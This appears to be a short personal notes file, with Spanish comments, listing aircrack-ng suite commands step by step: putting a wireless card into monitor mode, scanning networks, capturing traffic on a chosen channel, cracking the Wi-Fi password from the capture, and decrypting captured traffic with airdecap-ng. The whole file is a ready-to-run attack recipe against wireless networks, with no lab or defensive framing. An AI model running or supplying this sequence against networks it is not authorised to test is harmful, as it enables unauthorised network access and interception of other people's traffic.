#Primero se debe inizializar el monitor?
sudo airmon-ng

#se obtiene la red, y se usa
sudo airmon-ng start wlp4s0f4u2mon

#luego se sigue con
sudo airodump-ng wlp4s0f4u2mon

#Una vez que se ve el canal de interes, se llena con eso
sudo airodump-ng -c 6 wlp4s0f4u2mon

#despues se realiza la captura
sudo airodump-ng -c 6 -w capture wlp4s0f4u2mon

#luego se ven las capturas, y se crackea la contraseña
aircrack-ng capture-04.cap

#desencriptar trafico
sudo airdecap-ng -w 12:34:56:78:90 capture-04.cap